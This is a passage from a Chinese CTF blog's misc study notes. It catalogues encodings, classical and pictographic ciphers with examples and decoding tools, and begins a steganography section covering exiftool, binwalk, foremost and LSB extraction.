<p>aaencode代码，则是将正常的js代码转为好玩的特殊网络表情符号。如:<code>ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻ //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ)</code>这样的表情文字</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=703">AAEncode加密&#x2F;解密</a></p>
<p><a href="https://www.qtool.net/decode">jjencode与aaencode解密</a></p>
<h2 id="1-10-熊曰-x2F-新佛曰-x2F-佛曰"><a href="#1-10-熊曰-x2F-新佛曰-x2F-佛曰" class="headerlink" title="1.10. 熊曰&#x2F;新佛曰&#x2F;佛曰"></a>1.10. 熊曰&#x2F;新佛曰&#x2F;佛曰</h2><p>例子：<code>熊曰：呋食食和覺嗷嚁我麼啽咬盜噔哞噤</code>，<code>新佛曰：殿諸殿隸僧降吽殿諸殿陀摩隸僧殿缽薩願殿耨殿諸囉愍殿慧願殿喼降眾殿薩隸殿婆殿亦殿如囑</code>，<code>佛曰：訶諳僧涅諳波夜殿諸寫夷遮伽缽夢怯是參老倒智哆死得冥以哆心夢呐謹侄朋俱咒遮諳夜摩吉多罰實等</code></p>
<p>特点：这几种编码类似，都是以<code>XX曰：</code>开头，后面各种繁体字和生僻字</p>
<p><a href="http://hi.pcmoe.net/index.html">在线 与熊论道&#x2F;熊曰</a></p>
<p><a href="http://hi.pcmoe.net/buddha.html">在线 新约佛论禅</a></p>
<p><a href="https://www.keyfc.net/bbs/tools/tudoucode.aspx">在线 与佛论禅</a></p>
<h2 id="1-11-hex编码"><a href="#1-11-hex编码" class="headerlink" title="1.11. hex编码"></a>1.11. hex编码</h2><p>原理：编码时，将8位二进制码重新分组成两个4位的字节（8位&#x3D;1字节，其中一个字节的低4位是原字节的高4位，另一个字节的低4位是原字节的低4位，其他都补0，然后输出这两个字节对应十六进制数字作为编码。</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">ASCII码： A (65)<br>二进制码：0100_0001<br>重新分组：0000_0100 0000_0001<br>十六进制： 4 1<br>Hex编码：41<br></code></pre></td></tr></table></figure>
<p>结果：Hex编码后的长度是源数据的2倍</p>
<p>特点：0-9，A-F</p>
<h2 id="1-12-html编码"><a href="#1-12-html编码" class="headerlink" title="1.12. html编码"></a>1.12. html编码</h2><p>在HTML文件中，是HTML编写过程中使用特殊的编码字符来进行网页页面的正确显示，是网页上面的一种编码格式。</p>
<p>例子：&amp;的html实体编码是<code>&amp;amp;</code></p>
<p>特点：以<code>&amp;</code>开头，以<code>;</code>结尾</p>
<p><a href="https://www.codetable.net/asciikeycodes">html实体编码手册</a></p>
<h2 id="1-13-中文电码"><a href="#1-13-中文电码" class="headerlink" title="1.13. 中文电码"></a>1.13. 中文电码</h2><p>中文电码表采用了四位阿拉伯数字作代号，从0001到9999按四位数顺序排列，用四位数字表示最多一万个汉字、字母和符号。汉字先按部首，后按笔划排列。字母和符号放到电码表的最尾。</p>
<p>例子：<br><code>中：0022</code><br><code>文：2429</code><br><code>电：7193</code><br><code>码：4316</code></p>
<p>特点：四个数字一组</p>
<p><a href="http://code.mcdvisa.com/">在线查询中文电码</a></p>
<h2 id="1-14-凯撒密码"><a href="#1-14-凯撒密码" class="headerlink" title="1.14. 凯撒密码"></a>1.14. 凯撒密码</h2><p>古典密码，单表，加密可逆</p>
<h2 id="1-15-音符"><a href="#1-15-音符" class="headerlink" title="1.15. 音符"></a>1.15. 音符</h2><p>加密后变成一串音符</p>
<p>例子：<code>¶♯♬♪♫♭♬¶♩♫♬♪♩♩♬¶♬¶♯=</code></p>
<p>特点：全部由音乐符号组成</p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=yinyue">在线加解密</a></p>
<h2 id="1-16-盲文"><a href="#1-16-盲文" class="headerlink" title="1.16. 盲文"></a>1.16. 盲文</h2><blockquote>
<p>布莱尔创造的由6个点为基础结构的盲字，在纸面上有的凸起，有的不凸起，形成64种变化，即64种符形，在每个符号（单位称”方”）左右两列，每列各三个点，从左边自上而下叫做1、2、3点，从右边自上而下叫做4、5、6点。</p>
</blockquote>
<p><a href="https://unicode-table.com/cn/tools/braille/">在线翻译1</a></p>
<p><a href="https://www.qqxiuzi.cn/bianma/wenbenjiami.php?s=mangwen">在线翻译2</a></p>
<blockquote>
<p>英语字母盲文表如下</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/misc%E6%80%BB%E7%BB%93-%E7%9B%B2%E6%96%87-1.png"></p>
<blockquote>
<p>数字盲文表如下</p>
</blockquote>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/misc%E6%80%BB%E7%BB%93-%E7%9B%B2%E6%96%87-2.png"></p>
<h2 id="1-17-ook"><a href="#1-17-ook" class="headerlink" title="1.17. ook"></a>1.17. ook</h2><p>Ook! 与Brainfuck类似, 但用单词”Ook”，”Ook.” 和 “Ook?”代替。</p>
<p><a href="https://www.splitbrain.org/_static/ook/">在线网站1</a><br><a href="https://ctf.bugku.com/tool/brainfuck">在线网站2</a></p>
<h2 id="1-18-波利比奥斯方阵密码"><a href="#1-18-波利比奥斯方阵密码" class="headerlink" title="1.18. 波利比奥斯方阵密码"></a>1.18. 波利比奥斯方阵密码</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E6%B3%A2%E5%88%A9%E6%AF%94%E5%A5%A5%E6%96%AF%E6%96%B9%E9%98%B5%E5%AF%86%E7%A0%81.png"></p>
<h2 id="1-19-serpent"><a href="#1-19-serpent" class="headerlink" title="1.19. serpent"></a>1.19. serpent</h2><blockquote>
<p>对称密钥块密码</p>
</blockquote>
<p><a href="http://serpent.online-domain-tools.com/">在线加解密</a></p>
<h2 id="1-20-piet"><a href="#1-20-piet" class="headerlink" title="1.20. piet"></a>1.20. piet</h2><blockquote>
<p>用位图色块来编写程序</p>
</blockquote>
<p>本地命令：<code>npiet.exe -q a.png</code></p>
<p><a href="https://www.bertnase.de/npiet/npiet-execute.php">在线解释器</a></p>
<p>特点：颜色丰富的图片</p>
<h2 id="1-21-当铺密码"><a href="#1-21-当铺密码" class="headerlink" title="1.21. 当铺密码"></a>1.21. 当铺密码</h2><p>当前汉字有多少笔画出头，对应的明文就是数字几</p>
<p>例子:</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><code class="hljs txt">密文：王夫 井工 夫口 由中人 井中 夫夫 由中大<br>对应：67 84 70 123 82 77 125<br></code></pre></td></tr></table></figure>


<h2 id="1-22-brainfuck"><a href="#1-22-brainfuck" class="headerlink" title="1.22. brainfuck"></a>1.22. brainfuck</h2><blockquote>
<p>Brainfuck是一种极小化的计算机语言，只使用8种特定的符号</p>
</blockquote>
<p>注意内存中也可能会藏有信息，例如2023年羊城杯的GIFuck</p>
<p><a href="https://www.splitbrain.org/services/ook">在线转换1</a>，<a href="https://www.dcode.fr/brainfuck-language">在线转换2</a></p>
<p>例子：</p>
<figure class="highlight brainfuck"><table><tr><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-literal">+++++</span> <span class="hljs-literal">+++++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">++</span> <span class="hljs-literal">+++++</span> <span class="hljs-literal">+++</span>&lt;<span class="hljs-title">]</span> &gt;<span class="hljs-literal">++++</span> <span class="hljs-literal">++++</span><span class="hljs-string">.</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">--</span><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+</span> <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span> &gt;<span class="hljs-literal">++++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">++</span><br><span class="hljs-string">.</span>&lt;<span class="hljs-literal">+++</span> <span class="hljs-title">[</span><span class="hljs-literal">-</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">-</span>&lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">-</span> <span class="hljs-literal">----</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">+++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">+++</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">+</span><span class="hljs-string">.</span> &lt;<span class="hljs-literal">+++</span><span class="hljs-title">[</span> <span class="hljs-literal">-</span>&gt;<span class="hljs-literal">---</span> &lt;<span class="hljs-title">]</span>&gt;<span class="hljs-literal">--</span> <span class="hljs-literal">---</span><span class="hljs-string">.</span>&lt; <span class="hljs-literal">+++</span><span class="hljs-title">[</span><span class="hljs-literal">-</span><br>&gt;<span class="hljs-literal">+++</span>&lt; <span class="hljs-title">]</span>&gt;<span class="hljs-literal">+++</span> <span class="hljs-literal">+</span><span class="hljs-string">.</span><span class="hljs-literal">---</span> <span class="hljs-literal">-----</span> <span class="hljs-literal">-</span><span class="hljs-string">.</span><span class="hljs-string">.</span>&lt;<br></code></pre></td></tr></table></figure>

<h2 id="1-23-BubbleBabble编码"><a href="#1-23-BubbleBabble编码" class="headerlink" title="1.23. BubbleBabble编码"></a>1.23. BubbleBabble编码</h2><p>特征：五位小写字母一组，以<code>-</code>分割</p>
<p>例子：<code>xipak-herek-serid-bapok-horek-syrox</code></p>
<p><a href="http://www.hiencode.com/bubble.html">在线工具</a></p>
<h2 id="1-24-阴阳怪气编码"><a href="#1-24-阴阳怪气编码" class="headerlink" title="1.24. 阴阳怪气编码"></a>1.24. 阴阳怪气编码</h2><p>特征：<code>[&#39;就 这 ¿ &#39;, &#39;不 会 吧 ？ &#39;]</code></p>
<p><a href="https://github.com/mmdjiji/yygq.js">GitHub项目地址</a></p>
<p><a href="https://mmdjiji.gitee.io/yygq.js/">在线编码解密</a></p>
<h2 id="1-25-emoji-or-emoji-aes"><a href="#1-25-emoji-or-emoji-aes" class="headerlink" title="1.25. emoji or emoji-aes"></a>1.25. emoji or emoji-aes</h2><p>特征：都由表情符号组成</p>
<p>emoji-aes实际上就是aes加密文本，用一个key当作偏移，在表情字典中对应</p>
<p><a href="http://www.atoolbox.net/Tool.php?Id=937">emoji在线</a></p>
<p><a href="https://aghorler.github.io/emoji-aes/">emoji-aes在线</a></p>
<h2 id="1-26-codemoji"><a href="#1-26-codemoji" class="headerlink" title="1.26 codemoji"></a>1.26 codemoji</h2><p>特征是key和密文为表情符号</p>
<p><a href="https://codemoji.miaotony.xyz/#/encrypt">codemoji-encrypt</a><br><a href="https://codemoji.miaotony.xyz/cracker/">codemoji-cracker</a></p>
<h2 id="1-27-solfa-cipher"><a href="#1-27-solfa-cipher" class="headerlink" title="1.27 solfa-cipher"></a>1.27 solfa-cipher</h2><p>音乐密码</p>
<p><a href="https://wmich.edu/mus-theo/solfa-cipher/">solfa-cipher</a></p>
<h2 id="1-28-Code-Decabit"><a href="#1-28-Code-Decabit" class="headerlink" title="1.28 Code Decabit"></a>1.28 Code Decabit</h2><p>特征：由<code>+</code>和<code>-</code>组成，十位一组</p>
<p>例如：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">+-+-++--+- ++---+-++- -+--++-++- +--++-++-- --+++++--- ++-++---+- +++-+-+--- +-+-+---++ ---+++-++- -+--++-++- -+--+++-+- -+--++-++- -+--++-++- ++-+-+-+-- -+--+++-+- ++-++---+- -++++---+- -+--++-++- ++-+-+-+-- +-+++---+- +++-++---- ---+++-++- +-+-+---++ ++-+-+-+-- +-+-+--++- ++--+--++- -++++---+- +---+++-+- ++-+-+-+-- -++++---+- -+--+++-+- +--+-+-++- +++-+-+--- +-+++---+- -+--+-+++- -+--++-++- ---+++-++- ++++----+- -++++---+- -+--+++-+- -+--++-++- ----+++++-<br></code></pre></td></tr></table></figure>

<p><a href="https://www.dcode.fr/code-decabit">Code Decabit</a></p>
<h2 id="1-29-DNA编码"><a href="#1-29-DNA编码" class="headerlink" title="1.29 DNA编码"></a>1.29 DNA编码</h2><p>特征：由<code>ACGT</code>组成</p>
<p>加解密脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">mapping = &#123;<br><br><span class="hljs-string">&#x27;AAA&#x27;</span>:<span class="hljs-string">&#x27;a&#x27;</span>,<br><span class="hljs-string">&#x27;AAC&#x27;</span>:<span class="hljs-string">&#x27;b&#x27;</span>,<br><span class="hljs-string">&#x27;AAG&#x27;</span>:<span class="hljs-string">&#x27;c&#x27;</span>,<br><span class="hljs-string">&#x27;AAT&#x27;</span>:<span class="hljs-string">&#x27;d&#x27;</span>,<br><span class="hljs-string">&#x27;ACA&#x27;</span>:<span class="hljs-string">&#x27;e&#x27;</span>,<br><span class="hljs-string">&#x27;ACC&#x27;</span>:<span class="hljs-string">&#x27;f&#x27;</span>,<br><span class="hljs-string">&#x27;ACG&#x27;</span>:<span class="hljs-string">&#x27;g&#x27;</span>,<br><span class="hljs-string">&#x27;ACT&#x27;</span>:<span class="hljs-string">&#x27;h&#x27;</span>,<br><span class="hljs-string">&#x27;AGA&#x27;</span>:<span class="hljs-string">&#x27;i&#x27;</span>,<br><span class="hljs-string">&#x27;AGC&#x27;</span>:<span class="hljs-string">&#x27;j&#x27;</span>,<br><span class="hljs-string">&#x27;AGG&#x27;</span>:<span class="hljs-string">&#x27;k&#x27;</span>,<br><span class="hljs-string">&#x27;AGT&#x27;</span>:<span class="hljs-string">&#x27;l&#x27;</span>,<br><span class="hljs-string">&#x27;ATA&#x27;</span>:<span class="hljs-string">&#x27;m&#x27;</span>,<br><span class="hljs-string">&#x27;ATC&#x27;</span>:<span class="hljs-string">&#x27;n&#x27;</span>,<br><span class="hljs-string">&#x27;ATG&#x27;</span>:<span class="hljs-string">&#x27;o&#x27;</span>,<br><span class="hljs-string">&#x27;ATT&#x27;</span>:<span class="hljs-string">&#x27;p&#x27;</span>,<br><span class="hljs-string">&#x27;CAA&#x27;</span>:<span class="hljs-string">&#x27;q&#x27;</span>,<br><span class="hljs-string">&#x27;CAC&#x27;</span>:<span class="hljs-string">&#x27;r&#x27;</span>,<br><span class="hljs-string">&#x27;CAG&#x27;</span>:<span class="hljs-string">&#x27;s&#x27;</span>,<br><span class="hljs-string">&#x27;CAT&#x27;</span>:<span class="hljs-string">&#x27;t&#x27;</span>,<br><span class="hljs-string">&#x27;CCA&#x27;</span>:<span class="hljs-string">&#x27;u&#x27;</span>,<br><span class="hljs-string">&#x27;CCC&#x27;</span>:<span class="hljs-string">&#x27;v&#x27;</span>,<br><span class="hljs-string">&#x27;CCG&#x27;</span>:<span class="hljs-string">&#x27;w&#x27;</span>,<br><span class="hljs-string">&#x27;CCT&#x27;</span>:<span class="hljs-string">&#x27;x&#x27;</span>,<br><span class="hljs-string">&#x27;CGA&#x27;</span>:<span class="hljs-string">&#x27;y&#x27;</span>,<br><span class="hljs-string">&#x27;CGC&#x27;</span>:<span class="hljs-string">&#x27;z&#x27;</span>,<br><span class="hljs-string">&#x27;CGG&#x27;</span>:<span class="hljs-string">&#x27;A&#x27;</span>,<br><span class="hljs-string">&#x27;CGT&#x27;</span>:<span class="hljs-string">&#x27;B&#x27;</span>,<br><span class="hljs-string">&#x27;CTA&#x27;</span>:<span class="hljs-string">&#x27;C&#x27;</span>,<br><span class="hljs-string">&#x27;CTC&#x27;</span>:<span class="hljs-string">&#x27;D&#x27;</span>,<br><span class="hljs-string">&#x27;CTG&#x27;</span>:<span class="hljs-string">&#x27;E&#x27;</span>,<br><span class="hljs-string">&#x27;CTT&#x27;</span>:<span class="hljs-string">&#x27;F&#x27;</span>,<br><span class="hljs-string">&#x27;GAA&#x27;</span>:<span class="hljs-string">&#x27;G&#x27;</span>,<br><span class="hljs-string">&#x27;GAC&#x27;</span>:<span class="hljs-string">&#x27;H&#x27;</span>,<br><span class="hljs-string">&#x27;GAG&#x27;</span>:<span class="hljs-string">&#x27;I&#x27;</span>,<br><span class="hljs-string">&#x27;GAT&#x27;</span>:<span class="hljs-string">&#x27;J&#x27;</span>,<br><span class="hljs-string">&#x27;GCA&#x27;</span>:<span class="hljs-string">&#x27;K&#x27;</span>,<br><span class="hljs-string">&#x27;GCC&#x27;</span>:<span class="hljs-string">&#x27;L&#x27;</span>,<br><span class="hljs-string">&#x27;GCG&#x27;</span>:<span class="hljs-string">&#x27;M&#x27;</span>,<br><span class="hljs-string">&#x27;GCT&#x27;</span>:<span class="hljs-string">&#x27;N&#x27;</span>,<br><span class="hljs-string">&#x27;GGA&#x27;</span>:<span class="hljs-string">&#x27;O&#x27;</span>,<br><span class="hljs-string">&#x27;GGC&#x27;</span>:<span class="hljs-string">&#x27;P&#x27;</span>,<br><span class="hljs-string">&#x27;GGG&#x27;</span>:<span class="hljs-string">&#x27;Q&#x27;</span>,<br><span class="hljs-string">&#x27;GGT&#x27;</span>:<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-string">&#x27;GTA&#x27;</span>:<span class="hljs-string">&#x27;S&#x27;</span>,<br><span class="hljs-string">&#x27;GTC&#x27;</span>:<span class="hljs-string">&#x27;T&#x27;</span>,<br><span class="hljs-string">&#x27;GTG&#x27;</span>:<span class="hljs-string">&#x27;U&#x27;</span>,<br><span class="hljs-string">&#x27;GTT&#x27;</span>:<span class="hljs-string">&#x27;V&#x27;</span>,<br><span class="hljs-string">&#x27;TAA&#x27;</span>:<span class="hljs-string">&#x27;W&#x27;</span>,<br><span class="hljs-string">&#x27;TAC&#x27;</span>:<span class="hljs-string">&#x27;X&#x27;</span>,<br><span class="hljs-string">&#x27;TAG&#x27;</span>:<span class="hljs-string">&#x27;Y&#x27;</span>,<br><span class="hljs-string">&#x27;TAT&#x27;</span>:<span class="hljs-string">&#x27;Z&#x27;</span>,<br><span class="hljs-string">&#x27;TCA&#x27;</span>:<span class="hljs-string">&#x27;1&#x27;</span>,<br><span class="hljs-string">&#x27;TCC&#x27;</span>:<span class="hljs-string">&#x27;2&#x27;</span>,<br><span class="hljs-string">&#x27;TCG&#x27;</span>:<span class="hljs-string">&#x27;3&#x27;</span>,<br><span class="hljs-string">&#x27;TCT&#x27;</span>:<span class="hljs-string">&#x27;4&#x27;</span>,<br><span class="hljs-string">&#x27;TGA&#x27;</span>:<span class="hljs-string">&#x27;5&#x27;</span>,<br><span class="hljs-string">&#x27;TGC&#x27;</span>:<span class="hljs-string">&#x27;6&#x27;</span>,<br><span class="hljs-string">&#x27;TGG&#x27;</span>:<span class="hljs-string">&#x27;7&#x27;</span>,<br><span class="hljs-string">&#x27;TGT&#x27;</span>:<span class="hljs-string">&#x27;8&#x27;</span>,<br><span class="hljs-string">&#x27;TTA&#x27;</span>:<span class="hljs-string">&#x27;9&#x27;</span>,<br><span class="hljs-string">&#x27;TTC&#x27;</span>:<span class="hljs-string">&#x27;0&#x27;</span>,<br><span class="hljs-string">&#x27;TTG&#x27;</span>:<span class="hljs-string">&#x27; &#x27;</span>,<br><span class="hljs-string">&#x27;TTT&#x27;</span>:<span class="hljs-string">&#x27;.&#x27;</span><br><br><br>&#125;<br><br><br>encode_string = <span class="hljs-string">&#x27;OME&#x27;</span><br><br>decode_string = <span class="hljs-string">&#x27;GGAGCGCTG&#x27;</span><br><br>inverted_mapping = <span class="hljs-built_in">dict</span>(<span class="hljs-built_in">zip</span>(mapping.values(), mapping.keys()))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decode_dna</span>(<span class="hljs-params"> decode_string </span>):<br><br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>( <span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(decode_string), <span class="hljs-number">3</span> ):<br>        piece =  decode_string[i:i+<span class="hljs-number">3</span>]<br>        <span class="hljs-comment">## pieces.append()</span><br>        pieces.append( mapping[piece] )<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">encode_dna</span>(<span class="hljs-params">encode_string</span>):<br>    pieces = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> encode_string:<br>        piece =  inverted_mapping[i]<br>        pieces.append(piece)<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>.join(pieces)<br><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Decoded String is:- &#x27;</span>+ decode_dna(decode_string)<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Encoded DNA String is:- &#x27;</span>+ encode_dna(encode_string)<br></code></pre></td></tr></table></figure>

<h2 id="1-30-Gronsfeld"><a href="#1-30-Gronsfeld" class="headerlink" title="1.30. Gronsfeld"></a>1.30. Gronsfeld</h2><p>格罗斯费尔德密码(Gronsfeld cipher)实际上和维吉尼亚密码相同，除了使用了数字来代替字母以外没有什么区别。</p>
<p><a href="https://www.boxentriq.com/code-breaking/gronsfeld-cipher">在线解密</a></p>
<h1 id="图形密码"><a href="#图形密码" class="headerlink" title="图形密码"></a>图形密码</h1><p>这一部分较简单，对着表翻译就好，但也比较抽象，因为时常会出现奇奇怪怪的东西</p>
<h2 id="2-1-跳舞的小人"><a href="#2-1-跳舞的小人" class="headerlink" title="2.1. 跳舞的小人"></a>2.1. 跳舞的小人</h2><p>找到了三种不同的表，将密文与表一一对应即可（好像出自福尔摩斯）</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-7.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-8.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc-page2-9.png"></p>
<h2 id="2-2-猪圈密码"><a href="#2-2-猪圈密码" class="headerlink" title="2.2. 猪圈密码"></a>2.2. 猪圈密码</h2><p><a href="http://moersima.00cha.net/zhuquan.asp">猪圈密码在线转换</a></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/zhujuan.png"></p>
<p>以下几张是变种猪圈</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/zhujuanbianzhong1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/zhujuanbianzhong2.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/zhujuanbianzhong3.png"></p>
<h2 id="2-3-圣堂武士密码"><a href="#2-3-圣堂武士密码" class="headerlink" title="2.3. 圣堂武士密码"></a>2.3. 圣堂武士密码</h2><p>圣堂武士密码其实也是变种猪圈，不过比较有名</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/shengtangwushi.jpg"></p>
<h2 id="2-4-银河字母"><a href="#2-4-银河字母" class="headerlink" title="2.4. 银河字母"></a>2.4. 银河字母</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/yihezimu.jpg"></p>
<h2 id="2-5-凹凸字体"><a href="#2-5-凹凸字体" class="headerlink" title="2.5. 凹凸字体"></a>2.5. 凹凸字体</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/aotu.jpg"></p>
<h2 id="2-6-夏多密码（曲折密码）"><a href="#2-6-夏多密码（曲折密码）" class="headerlink" title="2.6. 夏多密码（曲折密码）"></a>2.6. 夏多密码（曲折密码）</h2><p>来源：作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码<br>整个夏多密码由两部分组成，码表和旋转方向</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/xiaoduo1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/xiaoduo2.png"></p>
<p>最后四个符号（1，2，3，4）可以出现在密文中的任意位置，它代表着在此之后的密文需要向什么方向旋转</p>
<h2 id="2-7-古埃及象形文字"><a href="#2-7-古埃及象形文字" class="headerlink" title="2.7. 古埃及象形文字"></a>2.7. 古埃及象形文字</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/guaiji1.png"></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/guaiji2.png"></p>
<h2 id="2-8-费兹象形文字"><a href="#2-8-费兹象形文字" class="headerlink" title="2.8. 费兹象形文字"></a>2.8. 费兹象形文字</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/feizixaingxingwenzi.png"></p>
<h2 id="2-9-Flag-Semaphore旗语"><a href="#2-9-Flag-Semaphore旗语" class="headerlink" title="2.9. Flag Semaphore旗语"></a>2.9. Flag Semaphore旗语</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/qiyu.png"></p>
<h2 id="2-10-船用信号旗"><a href="#2-10-船用信号旗" class="headerlink" title="2.10. 船用信号旗"></a>2.10. 船用信号旗</h2><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/summary/chuanyongxinhaoqi.png"></p>
<h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><p>各种奇奇怪怪又抽象的实在太多了，可以参考下面两篇文章中的字符表<br><a href="https://www.cnblogs.com/Nuy0ah/p/16138118.html">https://www.cnblogs.com/Nuy0ah/p/16138118.html</a><br><a href="https://www.bilibili.com/read/cv19369626/">https://www.bilibili.com/read/cv19369626/</a></p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>misc</tag>
        <tag>编码</tag>
        <tag>密码</tag>
      </tags>
  </entry>
  <entry>
    <title>misc总结(隐写篇)</title>
    <url>/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/misc%E6%80%BB%E7%BB%93(%E9%9A%90%E5%86%99%E7%AF%87).html</url>
    <content><![CDATA[<h1 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h1><h2 id="0x01-Exif信息隐藏"><a href="#0x01-Exif信息隐藏" class="headerlink" title="0x01 Exif信息隐藏"></a>0x01 Exif信息隐藏</h2><p>可交换图像文件格式简称exif，可以记录图片的属性信息和拍摄数据。Exif信息是可以被任意编辑的</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/桌面# exiftool 1.png<br>ExifTool Version Number         : 11.88<br>File Name                       : 1.png<br>Directory                       : .<br>File Size                       : 5.4 kB<br>File Modification Date/Time     : 2023:02:21 13:47:49+08:00<br>File Access Date/Time           : 2023:02:21 13:54:17+08:00<br>File Inode Change Date/Time     : 2023:02:21 13:53:15+08:00<br>File Permissions                : rwxrw-rw-<br>File Type                       : PNG<br>File Type Extension             : png<br>MIME Type                       : image/png<br>Image Width                     : 438<br>Image Height                    : 121<br>Bit Depth                       : 8<br>Color Type                      : RGB<br>Compression                     : Deflate/Inflate<br>Filter                          : Adaptive<br>Interlace                       : Noninterlaced<br>Pixels Per Unit X               : 5669<br>Pixels Per Unit Y               : 5669<br>Pixel Units                     : meters<br>Software                        : Snipaste<br>Image Size                      : 438x121<br>Megapixels                      : 0.053<br></code></pre></td></tr></table></figure>

<p>提取缩略图<br><code>exiftool -b -ThumbnailImage attachment.jpg &gt;flag.jpg </code></p>
<h2 id="0x02-文件修复"><a href="#0x02-文件修复" class="headerlink" title="0x02 文件修复"></a>0x02 文件修复</h2><p>文件头(尾)被修改或去除，需要修复文件格式</p>
<h2 id="0x03-文件附加"><a href="#0x03-文件附加" class="headerlink" title="0x03 文件附加"></a>0x03 文件附加</h2><p>在正常图片中插入额外的文件数据</p>
<p>使用工具<code>binwalk，foremost，dd</code>提取出来</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">root@lewiserii-pc:~/桌面# binwalk -e 1.png<br><br>DECIMAL       HEXADECIMAL     DESCRIPTION<br>--------------------------------------------------------------------------------<br>0             0x0             PNG image, 438 x 121, 8-bit/color RGB, non-interlaced<br>91            0x5B            Zlib compressed data, default compression<br><br>root@lewiserii-pc:~/桌面# foremost 1.png<br>Processing: 1.png<br>|*|<br></code></pre></td></tr></table></figure>

<p>如果检测到附加的数据，<code>binwalk</code>会在当前目录下生成一个<code>_[文件名].extracted</code>目录，<code>foremost</code>会生成一个<code>output</code>目录</p>
<p>在复杂一点的数据插入需要手动提取或使用脚本</p>
<h2 id="0x04-cloacked-pixel-需要passwd"><a href="#0x04-cloacked-pixel-需要passwd" class="headerlink" title="0x04 cloacked-pixel(需要passwd)"></a>0x04 cloacked-pixel(需要passwd)</h2><p>lsb隐写的一种<br>支持PNG，JPG，BMP等图片格式</p>
<p>隐写后会转为PNG</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#lsb.py 98 line</span><br>steg_img.save(imgFile + <span class="hljs-string">&quot;-stego.png&quot;</span>, <span class="hljs-string">&quot;PNG&quot;</span>)<br></code></pre></td></tr></table></figure>

<p>加密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">$ python lsb.py hide samples/orig.jpg samples/secret.zip p@$5w0rD<br>[*] Input image size: 640x425 pixels.<br>[*] Usable payload size: 99.61 KB.<br>[+] Payload size: 74.636 KB<br>[+] Encrypted payload size: 74.676 KB<br>[+] samples/secret.zip embedded successfully!<br></code></pre></td></tr></table></figure>

<p>解密</p>
<figure class="highlight text"><table><tr><td class="code"><pre><code class="hljs text">$ python lsb.py<br>LSB steganogprahy. Hide files within least significant bits of images.<br><br>Usage:<br>  lsb.py hide &lt;img_file&gt; &lt;payload_file&gt; &lt;password&gt;<br>  lsb.py extract &lt;stego_file&gt; &lt;out_file&gt; &lt;password&gt;<br>  lsb.py analyse &lt;stego_file&gt;<br></code></pre></td></tr></table></figure>

